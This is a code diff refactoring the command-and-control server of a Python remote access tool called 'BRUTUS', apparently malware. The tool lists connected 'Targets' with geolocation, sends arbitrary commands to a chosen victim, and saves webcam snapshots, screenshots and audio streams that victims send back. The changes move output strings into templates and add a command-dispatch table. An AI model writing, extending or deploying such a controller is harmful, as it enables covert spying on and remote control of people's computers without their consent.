@@ -19,28 +19,98 @@ import requests
 import json
 from bs4 import BeautifulSoup
 import locator
+import Command  # import the OO-Command module
 
 
 
 """ constants """
-
 VERSION = "BRUTUS V. 1.0 Beta"
 CURRENT_FOLDER = os.path.dirname(os.path.realpath(__file__))
 HOST = socket.gethostname()
 PORT = 8080
 
 """ globals """
-
 keyboard = Controller()
 ip = ""
 connections = {}
 window = None
 video_thread = None
 
+# String templates and helpers to avoid inconsistent inline formatting
+HEADER_TEMPLATE = "{version:<40}{ip}"
+CLIENT_HEADER = "ID\t\t       Address\t\t\t   Location\n\n"
+CLIENT_ROW_TEMPLATE = "{id}\t\t{addr}\t\t{location}"
+IP_TEMPLATE = "Current IP: {ip}"
+ERROR_CLIENT_NOT_FOUND = "[ ! ] ERROR Client not found."
+UNKNOWN_COMMAND_TEMPLATE = "[ ? ] Unknown command: {command}"
+CONN_CONNECT_TEMPLATE = "{time}  Target {addr!r} connected to the server."
+CONN_DISCONNECT_TEMPLATE = "{time}  Target {addr!r} disconnected from the server."
+CONN_LOST_TEMPLATE = "{time}  Target {addr!r} lost connection to the server."
+SNAPSHOT_SAVED_TEMPLATE = "\n{time} Snapshot saved to: {path}"
+SCREENSHOT_SAVED_TEMPLATE = "\n{time} Screenshot saved to: {path}"
+TIME_FMT = "%H:%M:%S"
+
+def ts():
+    """Return current timestamp string according to TIME_FMT."""
+    return time.strftime(TIME_FMT)
 
 
-""" PYQT5 Gui Class """
 
+def _cmd_show_header(window):
+    window.Output.clear()
+    window.Input.clear()
+    window.Output.addItem(HEADER_TEMPLATE.format(version=VERSION, ip=ip))
+
+def _cmd_show_clients(window, command):
+    # Build client listing using the row template
+    active_connections = "\n".join(
+        CLIENT_ROW_TEMPLATE.format(
+            id=key,
+            addr=connections[key].addr,
+            location=locator.get_location(connections[key].addr[0])
+        )
+        for key in connections.keys()
+    ) if connections else ""
+    window.Output.addItem(f"{CLIENT_HEADER}{active_connections}")
+    window.Input.clear()
+
+def _cmd_echo(window, command):
+    output_text = " ".join(command.split(" ")[1:])
+    window.Output.addItem(output_text)
+    window.Input.clear()
+
+def _cmd_quit(window, command):
+    window.hide()
+
+def _cmd_ip(window, command):
+    window.Output.addItem(IP_TEMPLATE.format(ip=ip))
+
+def _cmd_send_at(window, command):
+    try:
+        receiver_id = int(command.split("@")[0])
+        payload = command.split("@", 1)[1]
+        receiver = connections[receiver_id]
+        receiver.send(payload.encode("utf-8"))
+        window.Input.clear()
+    except Exception:
+        window.Output.addItem(ERROR_CLIENT_NOT_FOUND)
+
+commands = {
+    "ip": _cmd_ip,
+    "clear": lambda w, c=None: _cmd_show_header(w),
+    "quit": _cmd_quit,
+    "exit": _cmd_quit,
+    "echo ": _cmd_echo,            # prefix: "echo <text>"
+    "show_clients": _cmd_show_clients,
+    "show clients": _cmd_show_clients,
+    "sc": _cmd_show_clients,
+    # '@' is handled as pattern "<id>@<cmd>"
+    "@": _cmd_send_at,
+}
+
+
+
+""" PYQT5 GUI Class """‚
 class MyMainWindow(QtWidgets.QMainWindow):
     
     def __init__(self):
@@ -59,7 +129,7 @@ class MyMainWindow(QtWidgets.QMainWindow):
             ip_address = content["ip"]
             ip = ip_address
             self.Output.clear()
-            self.Output.addItem(f"{VERSION} \t\t\t\t\t          {ip}")
+            self.Output.addItem(HEADER_TEMPLATE.format(version=VERSION, ip=ip))
         except Exception as e:
             print("Could not retrieve Users IP!")
 
@@ -73,35 +143,23 @@ class MyMainWindow(QtWidgets.QMainWindow):
             global video_thread
 
             if str(key) == "Key.enter":
-                command = self.Input.text()
-                if command == "ip" or command == "get ip":
-                    self.Output.addItem(f"Current IP: {ip}")
-                elif command == "clear":
-                    self.Output.clear()
-                    self.Input.clear()
-                    self.Output.addItem(f"{VERSION} \t\t\t\t\t          {ip}")
-                elif command == "quit" or command == "exit":
-                    self.hide()
-                elif command.split(" ")[0] == "echo":
-                    output_text = " ".join(command.split(" ")[1:])
-                    self.Output.addItem(output_text)
-                    self.Input.clear()
-                elif command == "show_clients" or command == "show clients" or command == "sc":
-                    active_connections = "\n".join(f"{key}\t\t{connections[key].addr}\t\t{locator.get_location(connections[key].addr[0])}" for key in connections.keys())
-                    self.Output.addItem(f"\nID\t\t       Address\t\t\t   Location\n\n{active_connections}")
-                    self.Input.clear()
-                elif "@" in command:  
+                command = self.Input.text().strip()
+                if not command:
+                    return
 
-                    try:
-                        print(connections)
-                        receiver = command.split("@")[0]
-                        receiver = connections[int(receiver)]
-                        print(f"RECEIVER: {receiver}")
-                        receiver.send(command.split("@")[1].encode("utf-8"))
-                        self.Input.clear()
-                    except Exception as error:
-                        print(error)
-                        self.Output.addItem("[ ! ] ERROR Client not found.")
+                # Prepare context for command handlers
+                context = {
+                    "connections": connections,
+                    "ip": ip,
+                    "locator": locator,
+                    "version": VERSION,
+                }
+
+                # Delegate to the OO-Command subsystem
+                handled = Command.dispatch(command, self, context)
+                if not handled:
+                    self.Output.addItem(UNKNOWN_COMMAND_TEMPLATE.format(command=command))
+                    self.Input.clear()
 
         with Listener(on_press=on_press) as listener:
             listener.join()
@@ -132,7 +190,6 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
     def handle_read(self):
         global video_thread
 
-
         if ConnectionHandler.receiving_snapshot:
             data = self.recv(609600)
             image_name = f"snapshot_NUM{self.snapshot_number}.png"
@@ -145,7 +202,7 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
 
             self.snapshot_number += 1
             saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
-            self.window.Output.addItem(f"\n{time.strftime('%H:%M:%S')} Snapshot saved to: {saved_image_path}")
+            self.window.Output.addItem(SNAPSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
             ConnectionHandler.receiving_snapshot = False
         
         elif ConnectionHandler.receiving_screenshot:
@@ -160,7 +217,7 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
         
             self.screenshot_number += 1
             saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
-            self.window.Output.addItem(f"\n{time.strftime('%H:%M:%S')} Screenshot saved to: {saved_image_path}")
+            self.window.Output.addItem(SCREENSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
             ConnectionHandler.receiving_screenshot = False
        
         else:
@@ -176,17 +233,17 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
                 audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
                 audio_thread.start()
             elif data != "":
-                self.window.Output.addItem(f"\n{time.strftime('%H:%M:%S')} {data}")
+                self.window.Output.addItem(f"\n{ts()} {data}")
 
     def handle_close(self):
         self.close()
         connections.pop(self.id)
-        self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(self.addr)} disconnected from the server.")
+        self.window.Output.addItem(CONN_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))
 
     def handle_expt(self):
         self.close()
         connections.pop(self.id)
-        self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(self.addr)} lost connection to the server.")
+        self.window.Output.addItem(CONN_LOST_TEMPLATE.format(time=ts(), addr=self.addr))
 
 
 
@@ -206,7 +263,7 @@ class Server(asyncore.dispatcher):
         self.listen(5)
 
     def handle_accepted(self, sock, addr):
-        self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(addr)} connected to the server.")
+        self.window.Output.addItem(CONN_CONNECT_TEMPLATE.format(time=ts(), addr=addr))
         Server.client_number += 1
         connection = ConnectionHandler(sock, self.window, Server.client_number)
         connections[Server.client_number] = connection
@@ -231,9 +288,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
-
-
-
-
-
